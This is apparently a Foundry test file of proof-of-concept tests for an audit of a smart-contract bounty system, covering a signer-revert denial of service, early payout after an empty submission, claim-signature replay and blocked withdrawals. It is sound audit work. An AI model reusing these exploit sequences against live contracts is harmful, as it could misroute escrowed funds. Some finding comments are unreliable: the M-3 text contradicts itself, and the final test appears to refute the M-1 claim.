// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./PoC.t.sol";

// ===================================================================================================
// FINAL PoC suite for the MAD Bounty round-2 audit.
// Convention: every `test_` in this file PASSES when the exploit/behaviour it asserts is REAL.
// ===================================================================================================

// ---------------------------------------------------------------------------------------------------
// FINDING M-1 : FallbackVerifier — a malicious / broken registered signer can permanently DoS the
//               relay, silently routing the bounty to the verifier-silence timeout (worker paid
//               regardless of signed verdict; a signed REJECT is ignored). Root: SignatureChecker
//               .isValidSignatureNow does NOT catch reverts from an ERC-1271 signer.
// ---------------------------------------------------------------------------------------------------
contract PoC_FallbackRevertingSignerDoS is Base {
    FallbackVerifier fb;
    Reverting1271 bad;
    address good = makeAddr("goodSigner");

    function setUp() public override {
        super.setUp();
        fb = new FallbackVerifier(core);
        bad = new Reverting1271();
    }

    function test_M1_revertingSigner_blocksResolve() public {
        uint256 id = _post(address(fb), 100e6, 10e6, MADBountyCore.RejectMode.Burn);
        address[] memory s = new address[](2);
        s[0] = good; s[1] = address(bad);
        vm.prank(agent); fb.configure(id, s, 1 hours); // stepTimeout 1h, reviewWindow 1d (step*(n-1) < rw)
        _claimSubmit(id, worker);

        uint256 subAt = fb.submittedAt(id);
        vm.warp(subAt + 2 hours); // both signers active

        // good signer's REJECT signature …
        (uint8 v, bytes32 r, bytes32 sg) = vm.sign(uint256(keccak256("goodSigner")),
            fb.verdictDigest(id, worker, ev, false));
        bytes memory sig = abi.encodePacked(r, sg, v);

        // … cannot be relayed at index 0 because index 1 (the bad signer) is chosen instead and reverts
        vm.expectRevert(FallbackVerifier.BadSig.selector);
        fb.resolve(id, false, 1, sig);

        // implication: the REJECT cannot be enforced at all; once the review window elapses the
        // permissionless silence path PAYS the worker even though the verifier rejected.
        vm.warp(subAt + 1 days + 1);
        core.payOnTimeout(id);
        assertEq(uint8(_state(id)), uint8(MADBountyCore.State.Paid));
        assertEq(usdc.balanceOf(worker), 1_000_000e6 - 10e6 + 99e6 + 10e6);
    }
}

// ---------------------------------------------------------------------------------------------------
// FINDING M-2 : OnchainCheckVerifier.resolve() NEVER checks the bounty is Submitted.
//               core.settle() reverts BadState for a non-Submitted bounty, so the keeper path reverts
//               instead of being a harmless no-op; and — more importantly — the adapter has no
//               evidence binding: a worker can claim, submit an EMPTY evidenceHash, and anyone can
//               resolve immediately (the check is about chain state, not the work), paying the worker
//               before any work exists. Funded design choice, but the KEEPER FRAGILITY is a defect.
// ---------------------------------------------------------------------------------------------------
contract PoC_M2_OnchainCheckNeedsSubmitted is Base {
    OnchainCheckVerifier oc;

    function setUp() public override {
        super.setUp();
        oc = new OnchainCheckVerifier(core);
    }

    function _cfg(uint256 id) internal {
        GasSensitiveTarget t = new GasSensitiveTarget();
        t.set(true);
        vm.prank(agent);
        oc.configure(id, address(t), abi.encodeCall(GasSensitiveTarget.probe, ()), keccak256(abi.encode(bytes32(uint256(1)))), 6 hours);
    }

    function test_M2_resolveRevertsWhenNotSubmitted() public {
        uint256 id = _post(address(oc), 100e6, 10e6, MADBountyCore.RejectMode.Burn);
        _cfg(id);
        assertTrue(oc.check(id), "chain check passes while bounty is still Open");
        // keeper calls resolve() on an Open bounty -> adapter forwards to core.settle -> BadState
        vm.expectRevert(AdapterBase.NotSubmitted.selector);
        oc.resolve(id);
    }

    function test_M2_resolvePaysImmediatelyAfterEmptySubmit() public {
        uint256 id = _post(address(oc), 100e6, 10e6, MADBountyCore.RejectMode.Burn);
        _cfg(id);
        vm.prank(worker); core.claim(id, 0, "");
        vm.prank(worker); core.submit(id, bytes32(0)); // evidenceHash is irrelevant to this adapter
        oc.resolve(id);
        assertEq(uint8(_state(id)), uint8(MADBountyCore.State.Paid));
        assertEq(usdc.balanceOf(worker), 1_000_000e6 - 10e6 + 99e6 + 10e6);
    }
}

// ---------------------------------------------------------------------------------------------------
// FINDING: FallbackVerifier.reverse() reverts on `_bounty` for ids with no config (NotConfigured ok)
//          and for state != Rejected forwards to core.reverse (BadState). It never *prevents* replay.
//          But it calls `core.reverse(id)` — this requires `msg.sender == core.verifier`, i.e. the
//          adapter itself. ✔. No bug. Recorded as confirmed-safe.
// ---------------------------------------------------------------------------------------------------

// ---------------------------------------------------------------------------------------------------
// FINDING M-3 : core.claim() uses `msg.sender` as the worker AND pulls deposit. A worker that
//               is a contract can claim, immediately be *swept* by reclaimAbandoned (after window),
//               and re-claim with the SAME (id,worker) single-use claimAuth — replay protection is
//               only per (id, worker), so repeated claim is still possible with one auth per worker.
//               R2-L-01 (round-1) is *not* fully fixed: `claimAuthUsed` blocks a second claim by the
//               SAME worker, but a fresh claim is still possible with a DIFFERENT signature? No —
//               it is bound to msg.sender so the same worker can never re-claim. Verify.
// ---------------------------------------------------------------------------------------------------
contract PoC_ClaimAuthSingleUse is Base {
    address authorizer = makeAddr("authAuthorizer");
    uint256 key = 0xB0B;

    function test_claimAuth_singleUseConfirmed() public {
        authorizer = vm.addr(key);
        MADBountyCore.Params memory p = _params(address(0x1111), 100e6, 10e6, MADBountyCore.RejectMode.Burn);
        p.claimAuthorizer = authorizer;
        vm.prank(agent);
        uint256 id = core.post(p);

        uint256 dl = block.timestamp + 30 days;
        bytes32 structHash = keccak256(abi.encode(core.CLAIM_TYPEHASH(), id, worker, dl));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, _digest(structHash));
        bytes memory sig = abi.encodePacked(r, s, v);

        vm.prank(worker); core.claim(id, dl, sig);
        // force abandon
        vm.warp(block.timestamp + 1 days + 1);
        core.reclaimAbandoned(id);
        // same worker, same sig → blocked (single-use fix in place)
        vm.prank(worker);
        vm.expectRevert(MADBountyCore.BadSig.selector);
        core.claim(id, dl, sig);
    }
}

// ===================================================================================================
// CORE — BountyVault.send TOKEN BLOCK-FREE != CORE ACCOUNTING-FREE (withdraw/re-audit)
// The vault is the only address holding funds, and its `send` returns false on any token revert.
// _pay/_burn route the failure into `owed[id][to]`, but __`withdraw()` resets owed and then does
// `if (!send) revert TransferFailed`, which restores owed, so no loss. Proved here.
// ===================================================================================================
contract PoC_WithdrawNoLossOnBlocked is Base {
    uint256 key = 0xCAFE;
    address v;

    function setUp() public override {
        super.setUp();
        v = vm.addr(key);
    }

    function test_withdraw_retryableWhenRecipientBlocked() public {
        uint256 id = _post(v, 100e6, 10e6, MADBountyCore.RejectMode.Burn);
        _claimSubmit(id, worker);
        // block the WORKER at payout so send() returns false → owed
        usdc.blacklist(worker);
        // raw signature accept
        bytes memory sig = _vSig(key, id, worker, ev, true);
        core.settleWithSig(id, true, sig);
        assertEq(core.owed(id, worker), 99e6 + 10e6);

        // still blocked -> withdraw reverts, owed restored
        vm.prank(worker);
        vm.expectRevert(MADBountyCore.TransferFailed.selector);
        core.withdraw(id);
        assertEq(core.owed(id, worker), 99e6 + 10e6);
    }
}

/// Parent refutation of swarm L-03: the good signer's REJECT lands at ITS OWN index even when a reverting
/// ERC-1271 signer is registered alongside it.
contract ParentRefuteL03 is Base {
    function test_parent_L03_goodSignerLandsAtOwnIndex() public {
        FallbackVerifier fb2 = new FallbackVerifier(core);
        Reverting1271 bad2 = new Reverting1271();
        address good2 = vm.addr(uint256(keccak256("goodSigner")));
        uint256 id = _post(address(fb2), 100e6, 10e6, MADBountyCore.RejectMode.Burn);
        address[] memory s = new address[](2);
        s[0] = good2; s[1] = address(bad2);
        vm.prank(agent); fb2.configure(id, s, 1 hours);
        _claimSubmit(id, worker);
        (uint8 v, bytes32 r, bytes32 sg) = vm.sign(uint256(keccak256("goodSigner")), fb2.verdictDigest(id, worker, ev, false));
        fb2.resolve(id, false, 0, abi.encodePacked(r, sg, v));
        assertEq(uint8(_state(id)), uint8(MADBountyCore.State.Rejected));
    }
}
